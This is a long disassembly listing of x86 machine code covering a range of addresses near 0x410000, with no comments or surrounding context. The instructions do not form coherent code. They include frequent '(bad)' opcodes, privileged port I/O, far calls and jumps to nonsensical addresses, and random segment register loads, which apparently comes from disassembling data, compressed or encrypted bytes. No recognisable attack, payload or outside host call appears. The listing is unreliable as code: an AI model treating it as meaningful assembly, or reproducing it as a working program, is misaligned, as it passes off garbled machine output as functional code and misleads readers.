  4109ea:	inc    edx
  4109eb:	xor    al,0xcb
  4109ed:	lahf   
  4109ee:	addr16 sub eax,0xcd8a608f
  4109f4:	mov    WORD PTR ss:[ebx-0x2fc1985d],gs
  4109fb:	sti    
  4109fc:	pop    eax
  4109fd:	aad    0xec
  4109ff:	pushw  ss
  410a01:	pop    ss
  410a02:	ins    DWORD PTR es:[edi],dx
  410a03:	int3   
  410a04:	aam    0x6
  410a06:	shl    DWORD PTR [edi+0x518613ca],cl
  410a0c:	pusha  
  410a0d:	gs aad 0x13
  410a10:	ret    
  410a11:	xchg   edx,eax
  410a12:	popf   
  410a13:	adc    al,0xc9
  410a15:	jge    0x4109e2
  410a17:	loop   0x410a67
  410a19:	adc    BYTE PTR [ebp+0x35295c43],ah
  410a1f:	add    ecx,esp
  410a21:	retf   
  410a22:	mov    ss,WORD PTR es:[esi]
  410a25:	xchg   esp,eax
  410a26:	(bad)  
  410a27:	sbb    BYTE PTR [eax-0x40641f7d],ch
  410a2d:	js     0x410aac
  410a2f:	jp     0x4109e6
  410a31:	loop   0x410a45
  410a33:	iret   
  410a34:	dec    BYTE PTR [ebp+edi*1-0x37]
  410a38:	sub    DWORD PTR [edi-0x59],esp
  410a3b:	adc    al,0xc6
  410a3d:	mov    dh,0xd5
  410a3f:	push   ecx
  410a40:	mov    ebx,0xa83ef61a
  410a45:	mov    ch,0x3e
  410a47:	sub    BYTE PTR [ebp+edi*8-0x30],cl
  410a4b:	pop    edx
  410a4c:	dec    eax
  410a4d:	in     al,dx
  410a4e:	(bad)  
  410a4f:	aaa    
  410a50:	pop    ebx
  410a51:	imul   eax,edi,0xb5e33c1
  410a57:	sbb    eax,0x940e6860
  410a5c:	dec    edx
  410a5d:	dec    edx
  410a5e:	push   esi
  410a5f:	jle    0x410ade
  410a61:	pop    ebx
  410a62:	xchg   edi,eax
  410a63:	dec    ebp
  410a64:	mov    esp,DWORD PTR [ebp+0x5]
  410a67:	jbe    0x410a6a
  410a69:	dec    eax
  410a6a:	iret   
  410a6b:	pop    eax
  410a6c:	xchg   edx,eax
  410a6d:	jo     0x410ad9
  410a6f:	dec    ecx
  410a70:	nop
  410a71:	dec    ebx
  410a72:	push   edi
  410a73:	lds    ebp,FWORD PTR [edi]
  410a75:	call   0x96dad6eb
  410a7a:	int3   
  410a7b:	or     bh,BYTE PTR [ecx+ebp*4-0x6edaf71]
  410a82:	aaa    
  410a83:	ror    DWORD PTR [esi+eax*1+0x18],cl
  410a87:	xchg   ebx,eax
  410a88:	sub    BYTE PTR [esi],ch
  410a8a:	imul   esp,DWORD PTR [edi],0xe827c275
  410a90:	stos   BYTE PTR es:[edi],al
  410a91:	mov    al,0x4
  410a93:	call   0xc3fc:0x6511660b
  410a9a:	call   0xbe43:0x160d6a4e
  410aa1:	cwde   
  410aa2:	sub    eax,0x2b7bb354
  410aa7:	xchg   ebp,eax
  410aa8:	cmp    DWORD PTR [edx-0x7f],ecx
  410aab:	mov    al,BYTE PTR [ebx-0x1e48fc10]
  410ab1:	fucomp st(0)
  410ab3:	std    
  410ab4:	scas   eax,DWORD PTR es:[edi]
  410ab5:	mov    esp,0x919bbc3a
  410aba:	ret    
  410abb:	inc    esp
  410abc:	jp     0x410b21
  410abe:	inc    esp
  410abf:	dec    ebx
  410ac0:	push   esi
  410ac1:	push   esp
  410ac2:	rol    BYTE PTR [edi+0x3a],1
  410ac5:	rcr    eax,0x27
  410ac8:	push   0x680532d8
  410acd:	int    0xe8
  410acf:	or     ecx,DWORD PTR [ebx]
  410ad1:	test   al,0x68
  410ad3:	xor    esp,esp
  410ad5:	push   ecx
  410ad6:	sbb    ah,BYTE PTR ds:0x8982b31c
  410adc:	xor    ebp,DWORD PTR ds:0xa6d83ce
  410ae2:	fwait
  410ae3:	mov    al,0x19
  410ae5:	add    esi,DWORD PTR ds:0x21b6818f
  410aeb:	ja     0x410a84
  410aed:	push   ss
  410aee:	(bad)  
  410aef:	shr    DWORD PTR [edx-0x45],cl
  410af2:	imul   edx,ebp,0x54
  410af5:	inc    eax
  410af6:	inc    edi
  410af7:	stos   BYTE PTR es:[edi],al
  410af8:	pop    ss
  410af9:	pop    eax
  410afa:	push   ebx
  410afb:	mov    edx,DWORD PTR [ebp-0x1f]
  410afe:	loop   0x410a9f
  410b00:	sbb    eax,0x253ebe79
  410b05:	jmp    0x410b0b
  410b07:	sahf   
  410b08:	sub    eax,0xac37fc44
  410b0d:	test   BYTE PTR [edx-0x18],0xd8
  410b11:	mov    bl,0x55
  410b13:	pop    DWORD PTR [esi+0xfd5fc55]
  410b19:	pop    edi
  410b1a:	je     0x410b8a
  410b1c:	je     0x410b24
  410b1e:	aad    0xde
  410b20:	es xchg esp,eax
  410b22:	js     0x410b38
  410b24:	mov    esp,0xe9384d58
  410b29:	mov    ebx,cs
  410b2b:	jmp    0x410b50
  410b2d:	inc    edx
  410b2e:	aam    0x93
  410b30:	clc    
  410b31:	push   ebp
  410b32:	div    DWORD PTR ds:0xa3ae7ea0
  410b38:	es sbb ah,cl
  410b3b:	mov    esp,0x319d9a62
  410b40:	retf   
  410b41:	mov    WORD PTR [edx],es
  410b43:	rcl    DWORD PTR [eax],0x28
  410b46:	push   esi
  410b47:	cmp    al,0x7d
  410b49:	mov    ebx,0x56dfe205
  410b4e:	scas   eax,DWORD PTR es:[edi]
  410b4f:	jl     0x410b05
  410b51:	ins    BYTE PTR es:[edi],dx
  410b52:	loop   0x410b59
  410b54:	lock xchg esi,eax
  410b56:	jae    0x410b3d
  410b58:	call   0x4455c3d8
  410b5d:	push   ebp
  410b5e:	in     eax,0xdf
  410b60:	ss push DWORD PTR ds:[esi]
  410b64:	ins    BYTE PTR es:[edi],dx
  410b65:	add    BYTE PTR [edx+eax*8+0x7f3c79f5],0x26
  410b6d:	scas   al,BYTE PTR es:[edi]
  410b6e:	sbb    eax,0xf01beafa
  410b73:	mov    cs,ecx
  410b75:	es ja  0x410bac
  410b78:	sbb    ch,BYTE PTR [edi+esi*2-0x77]
  410b7c:	pop    ebx
  410b7d:	(bad)  
  410b7f:	in     eax,dx
  410b80:	in     eax,dx
  410b81:	mov    ds:0xca7a176a,al
  410b86:	cdq    
  410b87:	cmp    eax,0xbcad37d9
  410b8c:	sbb    eax,0x99543ec1
  410b91:	mov    al,ds:0xb1dff1b8
  410b96:	push   edx
  410b97:	ss jnp 0x410bb1
  410b9a:	adc    eax,0x8490ff9e
  410b9f:	bound  esi,QWORD PTR [edx+0x34]
  410ba2:	ficomp WORD PTR [ebp+0x1cdc23a0]
  410ba8:	popf   
  410ba9:	imul   esp,DWORD PTR [ebp+0x76],0x30
  410bad:	call   0xd003c6d6
  410bb2:	iret   
  410bb3:	addr16 aad 0x10
  410bb6:	ja     0x410b50
  410bb8:	jae    0x410b93
  410bba:	cmp    edi,DWORD PTR ds:0x75ad26a3
  410bc0:	mov    ecx,0x915cdf1c
  410bc5:	and    ecx,DWORD PTR [edx-0x33a19e09]
  410bcb:	pushf  
  410bcc:	mov    WORD PTR [edx-0x1200f757],?
  410bd2:	rcl    DWORD PTR [edi+0x11],0xd6
  410bd6:	xchg   esp,eax
  410bd7:	inc    edx
  410bd8:	push   edi
  410bd9:	sbb    DWORD PTR [eax],edx
  410bdb:	fcomi  st,st(6)
  410bdd:	sti    
  410bde:	mov    ecx,0x9c046229
  410be3:	mov    ds:0x6c6335cd,eax
  410be8:	ficom  WORD PTR [ebx]
  410bea:	adc    eax,0xd077f752
  410bef:	jecxz  0x410ba4
  410bf1:	adc    eax,0xb999eefb
  410bf6:	imul   esp,DWORD PTR [esi],0x8f54c814
  410bfc:	arpl   WORD PTR ds:0x513fd976,bp
  410c02:	xor    DWORD PTR [ebx],esp
  410c04:	jmp    DWORD PTR [ebx]
  410c06:	mov    eax,0x200b54e4
  410c0b:	pmaxub mm6,mm3
  410c0e:	dec    ebp
  410c0f:	iret   
  410c10:	call   0x455d1e8e
  410c15:	fwait
  410c16:	addr16 in eax,0xe8
  410c19:	jnp    0x410c98
  410c1b:	inc    ebx
  410c1c:	aam    0x4a
  410c1e:	je     0x410bfa
  410c20:	call   0x7a72ea34
  410c25:	int    0x7a
  410c27:	pop    edi
  410c28:	inc    edx
  410c29:	outs   dx,DWORD PTR ds:[esi]
  410c2a:	cmp    eax,0x58f3f25c
  410c2f:	xchg   BYTE PTR [ecx-0x45],ch
  410c32:	or     ah,ah
  410c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c35:	pop    ds
  410c36:	mov    ebx,0x1e4eb5a
  410c3b:	add    al,0x25
  410c3d:	sbb    ecx,esp
  410c3f:	dec    esp
  410c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c41:	jno    0x410c6e
  410c43:	push   eax
  410c44:	loopne 0x410c97
  410c46:	push   ds
  410c47:	pop    ebp
  410c48:	cmp    ecx,DWORD PTR [eax]
  410c4a:	lfs    ecx,FWORD PTR [esp+ebx*2]
  410c4e:	ja     0x410ca7
  410c50:	xor    bl,BYTE PTR [eax]
  410c52:	aam    0xd3
  410c54:	int    0x6e
  410c56:	jne    0x410ca5
  410c58:	mov    ah,0x99
  410c5a:	sbb    eax,0x65ab0b78
  410c5f:	cmp    DWORD PTR [eax],esi
  410c61:	out    0x14,eax
  410c63:	mov    al,0x83
  410c65:	movaps XMMWORD PTR [ecx],xmm4
  410c68:	rcl    ebp,0x41
  410c6b:	pop    ds
  410c6c:	mov    cl,0xff
  410c6e:	mov    dh,0xbe
  410c70:	lods   eax,DWORD PTR ds:[esi]
  410c71:	and    ebp,ebp
  410c73:	dec    esi
  410c74:	in     al,dx
  410c75:	push   ebp
  410c76:	xchg   esi,eax
  410c77:	adc    BYTE PTR [eax],cl
  410c79:	adc    al,BYTE PTR [edi+0x4ffeafe7]
  410c7f:	(bad)  
  410c80:	fst    DWORD PTR [edx+0x7dff703e]
  410c86:	not    edi
  410c88:	in     al,dx
  410c89:	scas   al,BYTE PTR es:[edi]
  410c8a:	fnstcw WORD PTR [eax+0x12]
  410c8d:	test   bl,dh
  410c8f:	test   BYTE PTR [ecx],dh
  410c91:	aam    0x83
  410c93:	cmc    
  410c94:	enter  0xda27,0x5e
  410c98:	sub    BYTE PTR [ecx],ah
  410c9a:	inc    eax
  410c9b:	ds (bad) 
  410c9d:	and    BYTE PTR [ebp+0x665e974d],bl
  410ca3:	pushf  
  410ca4:	jle    0x410c6b
  410ca6:	push   eax
  410ca7:	mov    cl,BYTE PTR [ebx+0x6668462e]
  410cad:	es sub al,0xb4
  410cb0:	stos   DWORD PTR es:[edi],eax
  410cb1:	pop    ebx
  410cb2:	jo     0x410cd8
  410cb4:	pushf  
  410cb5:	xor    eax,0x615de41b
  410cba:	ret    
  410cbb:	jne    0x410cb6
  410cbd:	fnstcw WORD PTR [eax-0x91d7dcd]
  410cc3:	mov    ecx,0x7b1dcd1
  410cc8:	imul   edi,DWORD PTR [ecx+0x538991ee],0xffffffd5
  410ccf:	data16 add al,BYTE PTR [eax-0x25]
  410cd3:	jge    0x410c97
  410cd5:	repz mov ah,0xf
  410cd8:	jbe    0x410c92
  410cda:	xchg   edx,eax
  410cdb:	out    0x78,al
  410cdd:	and    dh,dl
  410cdf:	fdivr  QWORD PTR [esi+0x3cec6a08]
  410ce5:	cli    
  410ce6:	push   edx
  410ce7:	loope  0x410d1b
  410ce9:	ret    
  410cea:	outs   dx,DWORD PTR ds:[esi]
  410ceb:	adc    al,0x8
  410ced:	pop    ecx
  410cee:	sub    cl,BYTE PTR [ecx-0x4d275967]
  410cf4:	sub    dl,BYTE PTR [edx]
  410cf6:	dec    ebp
  410cf7:	ins    DWORD PTR es:[edi],dx
  410cf8:	call   0x7613dc65
  410cfd:	out    0x52,al
  410cff:	in     eax,0x8f
  410d01:	xchg   esp,eax
  410d02:	push   es
  410d03:	cli    
  410d04:	and    eax,0xf68591aa
  410d09:	push   ebx
  410d0a:	pop    edx
  410d0b:	retf   0xb68c
  410d0e:	xor    al,al
  410d10:	repz add dl,dh
  410d13:	cdq    
  410d14:	xchg   ecx,eax
  410d15:	je     0x410d0d
  410d17:	hlt    
  410d18:	std    
  410d19:	push   0xffffffea
  410d1b:	adc    ch,BYTE PTR [esi+0x6d]
  410d1e:	add    esp,DWORD PTR [edi+esi*2]
  410d21:	inc    eax
  410d22:	mov    bl,0xc9
  410d24:	mov    bh,dh
  410d26:	add    eax,0x499b1a9f
  410d2b:	in     al,0x3
  410d2d:	rol    DWORD PTR [eax+0x5c],cl
  410d30:	outs   dx,BYTE PTR ds:[si]
  410d32:	dec    edi
  410d33:	and    DWORD PTR [ebx-0x79892fab],edi
  410d39:	push   0xffffffc0
  410d3b:	lds    eax,FWORD PTR [eax+0x71]
  410d3e:	cs sub bh,cl
  410d41:	or     DWORD PTR [edi-0x19e2f94e],eax
  410d47:	sub    DWORD PTR [eax-0x6d],ebp
  410d4a:	sub    eax,DWORD PTR ds:0xb9964284
  410d50:	jl     0x410d27
  410d52:	ins    BYTE PTR es:[edi],dx
  410d53:	or     bh,BYTE PTR [ecx-0x2b]
  410d56:	repz mov WORD PTR [esi],ds
  410d59:	dec    ebp
  410d5a:	dec    edx
  410d5b:	mov    eax,ds:0x5e6ae2d3
  410d60:	in     al,0xa0
  410d62:	test   BYTE PTR [eax+0x13],al
  410d65:	retf   
  410d66:	xor    BYTE PTR [edi],0x2a
  410d69:	psubsb mm7,QWORD PTR [ebp+0x1fe3e2c0]
  410d70:	and    BYTE PTR [edi+ebp*4-0x46],ah
  410d74:	lods   al,BYTE PTR ds:[esi]
  410d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d76:	lock loope 0x410d98
  410d79:	jno    0x410d8f
  410d7b:	js     0x410d34
  410d7d:	and    BYTE PTR [ebx],ch
  410d7f:	(bad)  
  410d80:	fmul   DWORD PTR [ebx]
  410d82:	outs   dx,BYTE PTR ds:[esi]
  410d83:	fimul  DWORD PTR [ebp-0x393eaa7]
  410d89:	mov    ebx,0x324dba25
  410d8e:	imul   bp,ax,0xff97
  410d92:	push   0x13bef0f8
  410d97:	je     0x410d65
  410d99:	dec    edi
  410d9a:	mov    ds:0xd34803b4,al
  410d9f:	jecxz  0x410dd6
  410da1:	ins    BYTE PTR es:[edi],dx
  410da2:	and    cl,BYTE PTR [ebx]
  410da4:	xor    al,0x81
  410da6:	fisub  DWORD PTR [edx+0x6eb5486f]
  410dac:	hlt    
  410dad:	pop    eax
  410dae:	loopne 0x410d5b
  410db0:	jge    0x410d93
  410db2:	in     al,dx
  410db3:	xor    cl,BYTE PTR [edi+0x5f8447fe]
  410db9:	into   
  410dba:	mov    cl,BYTE PTR [ebx-0x6940b7d0]
  410dc0:	push   esp
  410dc1:	fild   DWORD PTR [ebp+edi*1-0x30f412e5]
  410dc8:	neg    DWORD PTR [edi]
  410dca:	test   al,0x4
  410dcc:	je     0x410dc5
  410dce:	xor    eax,DWORD PTR [ecx-0x10216242]
  410dd4:	out    dx,al
  410dd5:	iret   
  410dd6:	jge    0x410dd2
  410dd8:	ror    DWORD PTR [edi+0x26],0xef
  410ddc:	jp     0x410e2a
  410dde:	test   BYTE PTR [esi+0x4b],dh
  410de1:	dec    esp
  410de2:	dec    ebp
  410de3:	mov    WORD PTR [esi-0x6cd81360],gs
  410de9:	in     al,dx
  410dea:	leave  
  410deb:	icebp  
  410dec:	fs out 0x37,al
  410def:	fldenv [ebp-0x5a]
  410df2:	push   cs
  410df3:	push   esi
  410df4:	xchg   DWORD PTR [ebx+0x7b1b66e4],esi
  410dfa:	mov    ds:0xbfa798c6,eax
  410dff:	cmp    al,0x27
  410e01:	push   ebp
  410e02:	xchg   ebx,eax
  410e03:	jns    0x410de4
  410e05:	mov    eax,0x5781eeb2
  410e0a:	pcmpgtd mm4,QWORD PTR [ebx+ebp*8-0x33f87eff]
  410e12:	out    0xfc,eax
  410e14:	jmp    0xc48fa448
  410e19:	ret    
  410e1a:	pop    ss
  410e1b:	inc    ebx
  410e1c:	outs   dx,DWORD PTR ds:[esi]
  410e1d:	and    eax,0x78ba2fd1
  410e22:	and    al,0x2c
  410e24:	icebp  
  410e25:	pushf  
  410e26:	mov    al,ds:0xfc0b2607
  410e2b:	lods   al,BYTE PTR ds:[esi]
  410e2c:	mov    dh,0xf3
  410e2e:	ins    DWORD PTR es:[edi],dx
  410e2f:	sub    eax,0xd13b4a14
  410e34:	mov    WORD PTR [edx-0x4d],ss
  410e37:	sahf   
  410e38:	nop
  410e39:	arpl   WORD PTR [esi-0x1266b5ac],si
  410e3f:	test   DWORD PTR [esi+ebp*4],edi
  410e42:	inc    edi
  410e43:	push   es
  410e44:	outs   dx,BYTE PTR ds:[esi]
  410e45:	pop    edi
  410e46:	imul   ebp,DWORD PTR [ebx-0x62],0xbc6751
  410e4d:	test   BYTE PTR [eax],al
  410e4f:	sub    al,0x57
  410e51:	fadd   DWORD PTR [edi-0x7f703f01]
  410e57:	push   ebx
  410e58:	repz mov edi,0x810f3d75
  410e5e:	scas   al,BYTE PTR es:[edi]
  410e5f:	scas   eax,DWORD PTR es:[edi]
  410e60:	cld    
  410e61:	ja     0x410e72
  410e63:	jae    0x410e2d
  410e65:	inc    ecx
  410e66:	inc    esp
  410e67:	push   edx
  410e68:	mov    eax,ds:0xf57b7a4
  410e6d:	loopne 0x410eb4
  410e6f:	ins    DWORD PTR es:[edi],dx
  410e70:	sub    eax,0xcec0e794
  410e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e76:	or     al,0xe2
  410e78:	push   ebp
  410e79:	loope  0x410e49
  410e7b:	fsubr  QWORD PTR [ecx-0x478ad752]
  410e81:	dec    esp
  410e82:	xor    eax,0xa3f8ee5e
  410e87:	aaa    
  410e88:	mov    ds:0x3c084de1,al
  410e8d:	iret   
  410e8e:	mov    esi,DWORD PTR [esi-0x6fa7ae4d]
  410e94:	repz dec edx
  410e96:	addr16 adc edx,edx
  410e99:	push   edi
  410e9a:	jmp    0x410e89
  410e9c:	push   ecx
  410e9d:	in     al,dx
  410e9e:	push   esi
  410e9f:	mov    WORD PTR ds:0xbbc72f93,gs
  410ea5:	jbe    0x410e56
  410ea7:	lock xlat BYTE PTR ds:[bx]
  410eaa:	sub    al,0x31
  410eac:	lds    edx,FWORD PTR [ebp-0x5a]
  410eaf:	ins    DWORD PTR es:[edi],dx
  410eb0:	mov    ebx,0xa54287ab
  410eb5:	cmc    
  410eb6:	mov    eax,0xb5eaf3d6
  410ebb:	sbb    eax,DWORD PTR [edi+edi*2+0x62]
  410ebf:	dec    esp
  410ec0:	sbb    ch,BYTE PTR [esp+ebp*8]
  410ec3:	add    DWORD PTR [edx-0x4],ecx
  410ec6:	inc    ebx
  410ec7:	lods   eax,DWORD PTR ds:[esi]
  410ec8:	imul   edx,DWORD PTR [edx-0x32c15724],0x9e871448
  410ed2:	hlt    
  410ed3:	scas   al,BYTE PTR es:[edi]
  410ed4:	pop    ds
  410ed5:	dec    esi
  410ed6:	sbb    eax,0x4b3f4ae4
  410edb:	add    BYTE PTR [edx-0x31],0xf7
  410edf:	out    dx,eax
  410ee0:	je     0x410e82
  410ee2:	sub    BYTE PTR [ecx+ebx*8-0x1e7b27a2],dh
  410ee9:	jb     0x410e88
  410eeb:	jbe    0x410eea
  410eed:	stc    
  410eee:	fdiv   DWORD PTR [ecx+0x29]
  410ef1:	push   ecx
  410ef2:	dec    edi
  410ef3:	test   eax,0x79c8a292
  410ef8:	icebp  
  410ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410efa:	adc    eax,0x1b950f2e
  410eff:	push   es
  410f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f01:	xchg   DWORD PTR [ecx],esp
  410f03:	adc    esi,DWORD PTR [ebx]
  410f05:	push   esp
  410f06:	mov    al,ds:0x47f4f0e6
  410f0b:	addr16 cld 
  410f0d:	xor    esp,esi
  410f0f:	shr    ch,1
  410f11:	and    al,0x41
  410f13:	popf   
  410f14:	sub    eax,0x7e1a061f
  410f19:	push   esi
  410f1a:	add    esi,DWORD PTR [edx-0x5b7e503e]
  410f20:	into   
  410f21:	jle    0x410f6d
  410f23:	(bad)  
  410f24:	fdiv   DWORD PTR [esi-0x63375179]
  410f2a:	and    BYTE PTR [edi+edx*2],bl
  410f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f2e:	jge    0x410f3c
  410f30:	jmp    0xe2fa:0xf6956eae
  410f37:	mov    es,WORD PTR [edx-0x18]
  410f3a:	add    BYTE PTR [ebx-0x3d],bl
  410f3d:	mov    ds:0xf7ff3f08,eax
  410f42:	pop    edi
  410f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f44:	cmp    DWORD PTR [eax+0x76ddfa87],ecx
  410f4a:	jmp    0x410f17
  410f4c:	sub    BYTE PTR [edi],cl
  410f4e:	or     bl,BYTE PTR [eax+0x7f]
  410f51:	ret    
  410f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f53:	(bad)  
  410f54:	jp     0x410f59
  410f56:	xor    ebp,esi
  410f58:	inc    esp
  410f59:	cmp    al,0x3c
  410f5b:	and    BYTE PTR [edx-0x11],bl
  410f5e:	retf   
  410f5f:	inc    edi
  410f60:	pop    edx
  410f61:	int3   
  410f62:	lea    edx,[ebx-0x65]
  410f65:	and    BYTE PTR [edi-0x2c],cl
  410f68:	adc    eax,0xb04fab08
  410f6d:	push   ecx
  410f6e:	inc    BYTE PTR [eax+0x10]
  410f71:	cmp    esp,DWORD PTR [ebp+0x27f716f4]
  410f77:	push   0x4015b6c0
  410f7c:	loopne 0x410f38
  410f7e:	bound  ecx,QWORD PTR [edx+0x61]
  410f81:	jge    0x410fc0
  410f83:	pop    ecx
  410f84:	dec    edx
  410f85:	push   ecx
  410f86:	outs   dx,DWORD PTR ds:[esi]
  410f87:	in     eax,dx
  410f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f89:	push   es
  410f8a:	pushf  
  410f8b:	les    edx,FWORD PTR [edi-0x47]
  410f8e:	inc    ebx
  410f8f:	(bad)
  410f92:	dec    esp
  410f93:	cmc    
  410f94:	das    
  410f95:	mov    ah,0x65
  410f97:	addr16 (bad) 
  410f9a:	push   ds
  410f9b:	jmp    FWORD PTR [ecx-0x1391166f]
  410fa1:	xchg   ebx,eax
  410fa2:	push   cs
  410fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fa4:	or     BYTE PTR [ebp-0x35],0x9
  410fa8:	int    0xdf
  410faa:	mul    esp
  410fac:	or     DWORD PTR [eax+0x34],eax
  410faf:	addr16 dec edi
  410fb1:	ss mov ebp,0xe66940aa
  410fb7:	cmp    bl,BYTE PTR [ebx-0x629cb753]
  410fbd:	sbb    eax,0xacf22af1
  410fc2:	mov    esp,0x856d1994
  410fc7:	jno    0x410f6a
  410fc9:	fiadd  WORD PTR [eax-0x5d65fdff]
  410fcf:	xor    esp,DWORD PTR [edi+0x75b72b09]
  410fd5:	or     eax,edx
  410fd7:	fidiv  DWORD PTR [edi+0x52f9e92f]
  410fdd:	jmp    0xcbcb7fa6
  410fe2:	or     BYTE PTR [ecx-0x39],al
  410fe5:	push   eax
  410fe6:	popa   
  410fe7:	and    cl,BYTE PTR [ebx]
  410fe9:	int    0xb5
  410feb:	(bad)  
  410fec:	std    
  410fed:	xor    esp,eax
  410fef:	shl    BYTE PTR [ecx-0x7f],0x29
  410ff3:	hlt    
  410ff4:	pusha  
  410ff5:	mov    esp,0x87536b3c
  410ffa:	add    dl,0xbe
  410ffd:	stos   DWORD PTR es:[edi],eax
  410ffe:	loop   0x41106f
  411000:	mov    esi,0x83ccf6f8
  411005:	aad    0x3a
  411007:	fdiv   QWORD PTR [ebx]
  411009:	test   al,0x51
  41100b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41100c:	out    dx,al
  41100d:	xchg   ebp,eax
  41100e:	push   edi
  41100f:	sbb    BYTE PTR [edx-0x7fc61ea1],dh
  411015:	imul   cl
  411017:	add    BYTE PTR [esi-0x30],al
  41101a:	icebp  
  41101b:	jbe    0x411053
  41101d:	shl    DWORD PTR [edx-0x325e76be],cl
  411023:	loope  0x411078
  411025:	inc    ebx
  411026:	sbb    BYTE PTR [edx+0x7ec80969],ah
  41102c:	jbe    0x4110a7
  41102e:	test   eax,0x32c98bdb
  411033:	inc    edx
  411034:	mov    edi,0x7c508aaf
  411039:	test   eax,0xcd39cecc
  41103e:	ficomp DWORD PTR [esi]
  411040:	add    eax,0x4df1c044
  411045:	js     0x41105d
  411047:	mov    WORD PTR [eax],fs
  411049:	pop    ebp
  41104a:	ficomp WORD PTR [eax+eax*8+0x74ca2c81]
  411051:	aad    0xdf
  411053:	ret    0x1eb8
  411056:	sub    ah,ch
  411058:	mov    esi,0x9014a2eb
  41105d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41105e:	dec    edx
  41105f:	lea    ebx,[eax+eiz*4+0x54]
  411063:	retf   0x791
  411066:	jmp    0xf6c9:0x2e6e
  41106c:	adc    cl,BYTE PTR [ebx+0x16]
  41106f:	lods   al,BYTE PTR ds:[esi]
  411070:	xlat   BYTE PTR ds:[ebx]
  411071:	sahf   
  411072:	mov    BYTE PTR [ebx],ch
  411074:	not    ah
  411076:	verw   WORD PTR [esi]
  411079:	push   ds
  41107a:	push   eax
  41107b:	and    DWORD PTR [bp+si],ebp
  41107e:	jecxz  0x41104d
  411080:	mov    edi,0xc08bd28a
  411085:	fcmovu st,st(4)
  411087:	pop    esi
  411088:	cmp    esp,DWORD PTR [ebx+0x49]
  41108b:	and    ecx,DWORD PTR [edx]
  41108d:	inc    ebx
  41108e:	nop
  41108f:	mov    ds,edx
  411091:	mov    DWORD PTR [si-0x45],ecx
  411095:	pop    ebx
  411096:	cmc    
  411097:	xchg   ebp,eax
  411098:	mov    ecx,0xfa34e362
  41109d:	les    ebx,FWORD PTR fs:[esi]
  4110a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110a1:	pop    ecx
  4110a2:	mov    dh,0xc4
  4110a4:	add    al,0x7
  4110a6:	and    BYTE PTR [ebx-0x57914828],0x6e
  4110ad:	into   
  4110ae:	jne    0x4110c0
  4110b0:	pop    ebx
  4110b1:	or     BYTE PTR [edi-0x32],cl
  4110b4:	xor    BYTE PTR [ebp-0x61],dl
  4110b7:	jp     0x411074
  4110b9:	push   ds
  4110ba:	pop    es
  4110bb:	xchg   cl,ch
  4110bd:	ins    DWORD PTR es:[edi],dx
  4110be:	xchg   ebx,eax
  4110bf:	not    BYTE PTR [edx+0x6c4317d]
  4110c5:	dec    ecx
  4110c6:	mov    bh,0x39
  4110c8:	bound  edx,QWORD PTR [edx]
  4110ca:	pop    ebp
  4110cb:	and    BYTE PTR [esi-0x5a],ah
  4110ce:	fst    DWORD PTR [ebx+0x13]
  4110d1:	or     WORD PTR [edx],ax
  4110d4:	pop    edx
  4110d5:	arpl   WORD PTR ds:[ebp+0x59d1af04],dx
  4110dc:	mov    ch,0xe
  4110de:	std    
  4110df:	out    0x19,al
  4110e1:	fistp  QWORD PTR [edx+ebp*8+0x1b765ca6]
  4110e8:	sub    al,0xb2
  4110ea:	gs fmul st(0),st
  4110ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ee:	in     eax,dx
  4110ef:	sub    dh,BYTE PTR [ecx]
  4110f1:	leave  
  4110f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110f3:	sub    al,0x15
  4110f5:	xchg   ebp,edi
  4110f7:	xchg   esi,eax
  4110f8:	fisttp DWORD PTR ds:0x78cf4119
  4110fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ff:	inc    DWORD PTR [edi-0x6d]
  411102:	dec    eax
  411103:	mov    dl,0xa7
  411105:	fiadd  WORD PTR [edx+esi*4]
  411108:	call   0x2411:0x6accbc09
  41110f:	inc    ebx
  411110:	mov    ecx,0x17a5e986
  411115:	sub    BYTE PTR [edi-0x7cc27ddd],al
  41111b:	or     al,0x83
  41111d:	int3   
  41111e:	sar    BYTE PTR [edi],1
  411120:	cwde   
  411121:	jne    0x4110b6
  411123:	adc    eax,0x67a4f900
  411128:	jp     0x411167
  41112a:	adc    bl,cl
  41112c:	and    BYTE PTR [eax+esi*2],0xde
  411130:	mov    BYTE PTR [ecx+0x10],dl
  411133:	daa    
  411134:	out    dx,eax
  411135:	push   0x2f
  411137:	add    cl,BYTE PTR ds:0x95cbd1d2
  41113d:	or     eax,0x65ca4533
  411142:	push   ecx
  411143:	xchg   ebp,eax
  411144:	add    eax,0x8a2bbedf
  411149:	cld    
  41114a:	dec    ebp
  41114b:	mov    ch,0x47
  41114d:	dec    esi
  41114e:	jle    0x411171
  411150:	pop    esi
  411151:	dec    ecx
  411152:	xor    BYTE PTR [eax],0x10
  411155:	icebp  
  411156:	in     eax,0xb1
  411158:	and    BYTE PTR [eax],0xb8
  41115b:	sub    BYTE PTR [ecx+ecx*4-0x474375a8],0x29
  411163:	call   0xff7556b6
  411168:	loopne 0x4111af
  41116a:	js     0x4111d7
  41116c:	or     BYTE PTR [esi-0x391eb905],dh
  411172:	pop    esp
  411173:	(bad)
  411177:	call   0xc963:0x3ee44f0e
  41117e:	outs   dx,BYTE PTR ds:[esi]
  41117f:	xor    al,0xe7
  411181:	add    ah,al
  411183:	inc    esi
  411184:	(bad)  
  411185:	cmp    BYTE PTR [ecx-0x47],cl
  411188:	push   ecx
  411189:	xchg   ecx,eax
  41118a:	mov    ebx,0xb672a1ac
  41118f:	xor    edx,DWORD PTR [esi]
  411191:	outs   dx,DWORD PTR ds:[esi]
